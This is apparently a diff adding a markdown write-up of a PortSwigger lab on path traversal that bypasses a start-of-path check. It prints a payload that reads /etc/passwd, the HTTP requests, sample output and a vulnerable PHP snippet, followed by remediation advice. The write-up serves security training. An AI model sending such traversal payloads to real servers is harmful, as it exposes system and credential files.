@@ -1,0 +1,223 @@
+# File Path Traversal with Validation of Start of Path
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| **Lab** | File path traversal with validation of start of path |
+| **Category** | Path Traversal / Directory Traversal |
+| **Severity** | High |
+| **CWE** | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
+| **OWASP Top 10** | A01:2021 – Broken Access Control |
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Path Traversal** vulnerability due to improper validation of user-supplied file paths. Instead of validating the final canonical path, the application only verified that the supplied filename began with the trusted directory `/var/www/images/`.
+
+By supplying a legitimate base directory followed by directory traversal sequences (`../`), it was possible to escape the intended directory and access arbitrary files on the server.
+
+The vulnerability was successfully exploited to disclose the contents of the Linux `/etc/passwd` file.
+
+---
+
+# Objective
+
+Retrieve the contents of:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Vulnerability Discovery
+
+While browsing a product page, the application requested the product image using the following endpoint:
+
+```http
+GET /image?filename=/var/www/images/6.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+Unlike previous Path Traversal labs, the application already supplied an **absolute filesystem path** instead of just a filename.
+
+This indicates that the backend directly consumes filesystem paths provided by the client.
+
+---
+
+# Exploitation
+
+The application appeared to validate only that the supplied path started with:
+
+```text
+/var/www/images/
+```
+
+The following payload preserves the expected prefix while escaping the directory afterwards:
+
+```text
+/var/www/images/../../../etc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Result
+
+The server successfully returned the contents of the Linux password file.
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+The lab was automatically marked as solved after the file was successfully retrieved.
+
+---
+
+# Technical Analysis
+
+The vulnerability exists because the application validates only the **beginning of the supplied path**, rather than the canonical path after normalization.
+
+A simplified implementation may resemble:
+
+```php
+if (strpos($filename, "/var/www/images/") === 0) {
+    readfile($filename);
+}
+```
+
+The supplied payload begins with the trusted directory:
+
+```text
+/var/www/images/
+```
+
+Therefore, the validation succeeds.
+
+Before opening the file, the operating system resolves the traversal sequences:
+
+```text
+/var/www/images/../../../etc/passwd
+```
+
+into:
+
+```text
+/etc/passwd
+```
+
+This occurs because each `../` moves one directory upwards.
+
+---
+
+# Proof of Concept
+
+## Original Request
+
+```http
+GET /image?filename=/var/www/images/6.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+## Malicious Request
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Root Cause
+
+The application validates the **raw input string** instead of the resolved filesystem path.
+
+Validation logic:
+
+```
+User Input
+        │
+        ▼
+Starts with "/var/www/images/"?
+        │
+       Yes
+        │
+        ▼
+Open file
+```
+
+Filesystem resolution:
+
+```
+/var/www/images/../../../etc/passwd
+
+↓
+
+/etc/passwd
+```
+
+The security check is bypassed because it occurs **before** path normalization.
+
+---
+
+# Impact
+
+An attacker can exploit this vulnerability to:
+
+- Read arbitrary files from the server.
+- Access configuration files.
+- Leak application source code.
+- Retrieve credentials and API keys.
+- Gather sensitive information for privilege escalation.
+- Facilitate further attacks, including Remote Code Execution when combined with other vulnerabilities.
+
+---
+
+# Remediation
+
+To mitigate this vulnerability:
+
+- Canonicalize the requested path using functions such as `realpath()`.
+- Validate the canonical path instead of the raw user input.
+- Ensure that the resolved path remains inside the intended directory.
+- Reject any request containing traversal components after normalization.
+- Avoid accepting arbitrary filesystem paths from users.
+- Use allowlists of permitted filenames or file identifiers whenever possible.
+- Apply the principle of least privilege to the application's filesystem permissions.
+
+---
+
+# References
+
+- PortSwigger Web Security Academy – Path Traversal
+- OWASP Path Traversal
+- CWE-22 – Improper Limitation of a Pathname to a Restricted Directory
+
+---
+
+# Key Takeaways
+
+This lab demonstrates that validating only the **prefix** of a file path is insufficient.
+
+Although the supplied path begins with the trusted directory, the operating system subsequently resolves the traversal sequences, allowing access to files outside the intended location.
+
+Effective defenses must always:
+
+1. Fully resolve the filesystem path.
+2. Canonicalize it.
+3. Verify that the resolved path remains inside the authorized directory.
+
+Failure to validate the canonical path leaves the application vulnerable to Path Traversal attacks despite seemingly restrictive input validation.
